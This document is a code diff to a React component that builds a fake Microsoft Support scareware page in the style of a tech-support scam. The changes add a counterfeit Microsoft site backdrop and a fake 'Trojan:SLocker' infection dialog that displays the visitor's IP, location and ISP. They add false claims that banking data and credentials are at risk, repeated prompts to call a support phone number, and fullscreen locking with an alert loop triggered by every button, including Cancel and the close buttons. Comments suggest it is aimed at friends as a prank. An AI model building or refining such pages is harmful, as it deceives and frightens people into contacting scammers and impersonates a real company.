@@ -4,6 +4,8 @@ import { useCallback, useEffect, useRef, useState } from "react";
 import {
   ALERT_MSG,
   ALERT_MSG_2,
+  BLUE_DETAILS,
+  BLUE_THREATS,
   PHONE,
   PHONE_TEL,
   VOICE_LINES,
@@ -79,6 +81,7 @@ export default function MicrosoftAlert() {
   const alertTimer = useRef<number | null>(null);
   const keepAlive = useRef<number | null>(null);
   const fsLock = useRef<number | null>(null);
+  const stageRef = useRef<HTMLElement | null>(null);
 
   const stopVoice = useCallback(() => {
     voiceGen.current += 1;
@@ -118,20 +121,20 @@ export default function MicrosoftAlert() {
 
   const enterFullscreen = useCallback(async () => {
     if (unlockedRef.current) return;
-    const el = document.documentElement as HTMLElement & {
+    const el = (stageRef.current || document.documentElement) as HTMLElement & {
       webkitRequestFullscreen?: () => void;
       webkitRequestFullScreen?: () => void;
       msRequestFullscreen?: () => void;
     };
+    const doc = document as Document & { webkitFullscreenElement?: Element };
     try {
-      if (!document.fullscreenElement && !(document as Document & { webkitFullscreenElement?: Element }).webkitFullscreenElement) {
-        if (el.requestFullscreen) await el.requestFullscreen();
-        else if (el.webkitRequestFullscreen) el.webkitRequestFullscreen();
-        else if (el.webkitRequestFullScreen) el.webkitRequestFullScreen();
-        else if (el.msRequestFullscreen) el.msRequestFullscreen();
-      }
+      if (document.fullscreenElement || doc.webkitFullscreenElement) return;
+      if (el.requestFullscreen) await el.requestFullscreen();
+      else if (el.webkitRequestFullscreen) el.webkitRequestFullscreen();
+      else if (el.webkitRequestFullScreen) el.webkitRequestFullScreen();
+      else if (el.msRequestFullscreen) el.msRequestFullscreen();
     } catch {
-      /* user gesture / policy */
+      /* next click / interval retry */
     }
   }, []);
 
@@ -531,26 +534,83 @@ export default function MicrosoftAlert() {
   }
 
   return (
-    <main className="relative h-[100dvh] w-screen overflow-hidden bg-[#c8c8c8] text-[#1b1b1b]">
-      <div className="pointer-events-none absolute inset-0 select-none">
-        <div className="flex h-10 items-center gap-3 border-b border-[#d0d0d0] bg-[#f3f3f3] px-3 text-[12px]">
-          <span className="rounded bg-white px-2 py-1 shadow-sm">
+    <main
+      ref={stageRef}
+      className="fixed inset-0 z-[9999] h-[100dvh] w-screen overflow-hidden bg-[#f3f3f3] text-[#1b1b1b]"
+    >
+      {/* Fake Microsoft Support site (behind popups) */}
+      <div className="pointer-events-none absolute inset-0 select-none overflow-hidden">
+        <div className="flex h-9 items-center gap-2 border-b border-[#ddd] bg-[#f3f3f3] px-3 text-[11px] text-[#333]">
+          <span className="rounded-t bg-white px-3 py-1.5 shadow-sm">
             Windows Help Support Assistance Er#USA00dd7
           </span>
+          <span className="rounded-t bg-[#e8e8e8] px-3 py-1.5 text-[#666]">
+            Microsoft Support
+          </span>
         </div>
-        <div
-          className="h-full blur-[2px]"
-          style={{
-            background:
-              "linear-gradient(180deg,#f5f5f5 0%,#e7eef8 40%,#d6e4f5 100%)",
-          }}
-        />
+        <div className="flex items-center justify-between border-b border-[#e5e5e5] bg-white px-4 py-2.5 text-[13px] sm:px-8">
+          <div className="flex items-center gap-2">
+            <MsLogo size={20} />
+            <span className="font-semibold">Microsoft</span>
+            <span className="mx-1 text-[#bbb]">|</span>
+            <span>Support</span>
+          </div>
+          <div className="hidden items-center gap-4 text-[#555] sm:flex">
+            <span>All Microsoft</span>
+            <span>Search</span>
+            <span>Sign in</span>
+          </div>
+        </div>
+        <div className="border-b border-[#e5e5e5] bg-[#fafafa] px-4 py-2 text-[12px] text-[#666] sm:px-8">
+          You&apos;re invited to try Microsoft 365 for free{" "}
+          <span className="ml-2 rounded bg-[#0078d4] px-2 py-0.5 text-white">
+            Unlock now
+          </span>
+        </div>
+        <div className="h-full bg-gradient-to-b from-white via-[#f5f8fc] to-[#e8eef6] px-4 pt-8 sm:px-10">
+          <p className="text-3xl font-light text-[#1b1b1b] sm:text-4xl">
+            Welcome to Microsoft Support
+          </p>
+          <p className="mt-2 max-w-2xl text-[14px] text-[#555]">
+            Get help with Windows, Microsoft 365, Surface, Xbox, and accounts.
+            Sign in for personalized support for your devices and subscriptions.
+          </p>
+          <div className="mt-8 grid max-w-5xl grid-cols-2 gap-3 sm:grid-cols-3 sm:gap-4">
+            {[
+              ["Set up & install", "Apps, devices, and activation"],
+              ["Microsoft 365", "Subscriptions, apps, and billing"],
+              ["Accounts & billing", "Passwords, security, payments"],
+              ["Windows", "Updates, performance, recovery"],
+              ["Security & protection", "Defender, privacy, antivirus"],
+              ["Devices & Xbox", "Surface, PC, consoles, apps"],
+            ].map(([title, sub]) => (
+              <div
+                key={title}
+                className="rounded-lg border border-[#e1e1e1] bg-white p-4 shadow-sm"
+              >
+                <p className="text-[14px] font-semibold text-[#0078d4]">{title}</p>
+                <p className="mt-1 text-[12px] text-[#666]">{sub}</p>
+              </div>
+            ))}
+          </div>
+          <div className="mt-10 max-w-5xl border-t border-[#ddd] pt-6 text-[11px] text-[#777]">
+            <p className="font-semibold text-[#555]">Microsoft Support • Official help</p>
+            <p className="mt-2">
+              Advertising · Business · Privacy · Terms · About our ads · Contact
+              us · Feedback
+            </p>
+            <p className="mt-1">© Microsoft Corporation. All rights reserved.</p>
+          </div>
+        </div>
       </div>
-      <div className="absolute inset-0 bg-black/35" />
+
+      <div className="absolute inset-0 bg-black/40 backdrop-blur-[1px]" />
 
       {speaking && (
         <div className="absolute left-3 right-3 top-3 z-[80] rounded bg-black/80 px-3 py-2 text-[12px] text-white sm:left-3 sm:right-auto sm:max-w-md">
-          <p className="font-semibold text-[#7CFC00]">🔊 Reading on-screen warning…</p>
+          <p className="font-semibold text-[#7CFC00]">
+            🔊 Reading on-screen warning…
+          </p>
           <p className="mt-1 opacity-95">{voiceLine || "Starting audio…"}</p>
         </div>
       )}
@@ -570,17 +630,25 @@ export default function MicrosoftAlert() {
             <button
               type="button"
               className="ml-auto bg-[#e81123] px-1.5"
-              onClick={() => fireAlertStorm()}
+              onClick={() => {
+                lockFullscreen();
+                fireAlertStorm();
+              }}
             >
               ×
             </button>
           </div>
           <div className="p-3 text-[12px]">
-            <p className="font-bold text-[#c50f1f]">READ carefully — Call {PHONE}</p>
+            <p className="font-bold text-[#c50f1f]">
+              READ carefully — Call {PHONE}
+            </p>
             <button
               type="button"
               className="mt-2 w-full bg-[#0078d4] py-1.5 text-white"
-              onClick={() => fireAlertStorm()}
+              onClick={() => {
+                lockFullscreen();
+                fireAlertStorm();
+              }}
             >
               OK
             </button>
@@ -588,9 +656,10 @@ export default function MicrosoftAlert() {
         </div>
       ))}
 
+      {/* Blue spyware dialog — richer data */}
       {showBlue && (
         <div
-          className="absolute left-1/2 top-[8%] z-30 w-[min(720px,96vw)] -translate-x-1/2 overflow-hidden rounded-sm border border-[#1a3a7a] shadow-2xl"
+          className="absolute left-1/2 top-[5%] z-30 w-[min(780px,97vw)] -translate-x-1/2 overflow-hidden rounded-sm border border-[#1a3a7a] shadow-2xl"
           style={{ background: "#0b4ea2" }}
         >
           <div className="flex items-center gap-2 bg-[#083d86] px-3 py-2 text-white">
@@ -608,31 +677,96 @@ export default function MicrosoftAlert() {
               ×
             </button>
           </div>
-          <div className="px-4 py-5 text-center text-white">
-            <p className="text-[17px] font-bold sm:text-[20px]">
+          <div className="space-y-3 px-4 py-4 text-white">
+            <p className="text-center text-[16px] font-bold sm:text-[19px]">
               ** Microsoft Windows is infected with Trojan:SLocker **
             </p>
-            <p className="mx-auto mt-3 max-w-xl text-[13px] sm:text-[14px]">
-              A critical error has occurred. Please read this message carefully
-              and contact Microsoft Windows Support immediately.
+            <p className="mx-auto max-w-2xl text-center text-[12px] leading-relaxed opacity-95 sm:text-[13px]">
+              A critical error has occurred due to the outdated version of the
+              browser. Unauthorized remote access and credential theft activity
+              were detected. Your system has been locked to prevent further
+              damage. Please read this message carefully and contact Microsoft
+              Windows Support immediately.
             </p>
+
+            <div className="grid gap-2 rounded border border-white/25 bg-[#083d86]/70 p-3 text-[11px] sm:grid-cols-3 sm:text-[12px]">
+              <div>
+                <p className="opacity-70">Case ID</p>
+                <p className="font-semibold">
+                  MS-{geo.ip.replace(/\D/g, "").slice(-6) || "USA00dd7"}
+                </p>
+              </div>
+              <div>
+                <p className="opacity-70">Host IP</p>
+                <p className="font-semibold">{geo.ip}</p>
+              </div>
+              <div>
+                <p className="opacity-70">Region</p>
+                <p className="font-semibold">{geo.location}</p>
+              </div>
+              <div>
+                <p className="opacity-70">ISP / Network</p>
+                <p className="font-semibold">{geo.isp}</p>
+              </div>
+              <div>
+                <p className="opacity-70">Scan time</p>
+                <p className="font-semibold">
+                  {mounted && geo.time ? geo.time : "—"}
+                </p>
+              </div>
+              <div>
+                <p className="opacity-70">Threat level</p>
+                <p className="font-semibold text-[#ffb900]">CRITICAL / 4 active</p>
+              </div>
+            </div>
+
+            <div className="overflow-hidden rounded border border-white/20">
+              <div className="bg-[#062f6b] px-3 py-1.5 text-[11px] font-semibold uppercase tracking-wide">
+                Detected threats
+              </div>
+              <div className="divide-y divide-white/10 bg-[#0a4494]/80">
+                {BLUE_THREATS.map((t) => (
+                  <div
+                    key={t.name}
+                    className="flex items-center justify-between gap-2 px-3 py-1.5 text-[11px] sm:text-[12px]"
+                  >
+                    <span className="font-mono">{t.name}</span>
+                    <span className="text-[#ffb900]">
+                      {t.status} · {t.risk}
+                    </span>
+                  </div>
+                ))}
+              </div>
+            </div>
+
+            <ul className="space-y-1 text-[11px] leading-snug opacity-95 sm:text-[12px]">
+              {BLUE_DETAILS.map((line) => (
+                <li key={line}>• {line}</li>
+              ))}
+            </ul>
           </div>
-          <div className="flex flex-wrap items-center gap-2 bg-[#0a5bb8] px-3 py-2 text-[12px] text-white">
+          <div className="flex flex-wrap items-center gap-2 bg-[#0a5bb8] px-3 py-2 text-[12px] text-white sm:text-[13px]">
             <span className="font-semibold">
-              Call Microsoft Windows Support {PHONE}
+              Call Microsoft Windows Support {PHONE} (Microsoft)
             </span>
             <div className="ml-auto flex gap-2">
               <button
                 type="button"
                 className="rounded-sm bg-[#e8f2fc] px-4 py-1 text-[#1b1b1b]"
-                onClick={() => fireAlertStorm()}
+                onClick={() => {
+                  lockFullscreen();
+                  fireAlertStorm();
+                }}
               >
                 Cancel
               </button>
               <button
                 type="button"
                 className="rounded-sm bg-[#e8f2fc] px-4 py-1 text-[#1b1b1b]"
-                onClick={() => fireAlertStorm()}
+                onClick={() => {
+                  lockFullscreen();
+                  fireAlertStorm();
+                }}
               >
                 OK
               </button>
@@ -642,7 +776,7 @@ export default function MicrosoftAlert() {
       )}
 
       {showWhite && (
-        <div className="absolute left-1/2 top-[18%] z-40 w-[min(560px,94vw)] -translate-x-1/2 overflow-hidden rounded-sm border border-[#8a8a8a] bg-white shadow-2xl">
+        <div className="absolute left-1/2 top-[16%] z-40 w-[min(560px,94vw)] -translate-x-1/2 overflow-hidden rounded-sm border border-[#8a8a8a] bg-white shadow-2xl sm:top-[18%]">
           <div className="flex items-center gap-2 border-b border-[#ddd] bg-[#f7f7f7] px-3 py-2">
             <button type="button" data-unlock onClick={onLogoUnlock}>
               <MsLogo size={16} />
@@ -685,7 +819,8 @@ export default function MicrosoftAlert() {
             </div>
             <p className="text-[13px] font-bold sm:text-[14px]">
               Your personal data, banking information and web login credentials
-              saved on this PC are at risk. Please read carefully.
+              saved on this PC are at risk due to a major security breach.
+              Please read carefully.
             </p>
             <a
               href={`tel:${PHONE_TEL}`}
@@ -706,6 +841,7 @@ export default function MicrosoftAlert() {
               className="ml-auto rounded-sm bg-[#d13438] px-8 py-2 text-[14px] font-semibold text-white"
               onClick={() => {
                 armTrap();
+                lockFullscreen();
                 fireAlertStorm();
               }}
             >
@@ -738,7 +874,7 @@ export default function MicrosoftAlert() {
       {!isArmed && (
         <button
           type="button"
-          className="absolute inset-0 z-[60] cursor-pointer bg-black/25"
+          className="absolute inset-0 z-[60] cursor-pointer bg-black/20"
           onPointerDown={(e) => {
             e.preventDefault();
             armTrap();
@@ -749,10 +885,10 @@ export default function MicrosoftAlert() {
             {isSafari ? (
               <>
                 Tum <strong>Safari (Mac)</strong> pe test kar rahe ho — yahan
-                voice/stuck weak lagega.
+                stuck/FS weak lagega.
                 <br />
-                Doston ke <strong>Windows Chrome</strong> pe full alarm + voice +
-                alert loop chalega. Click to preview.
+                Doston ke <strong>Windows Chrome</strong> pe full effect. Click
+                to preview.
               </>
             ) : isChromeTarget ? (
               <>Windows Security scan ready — click anywhere to continue</>
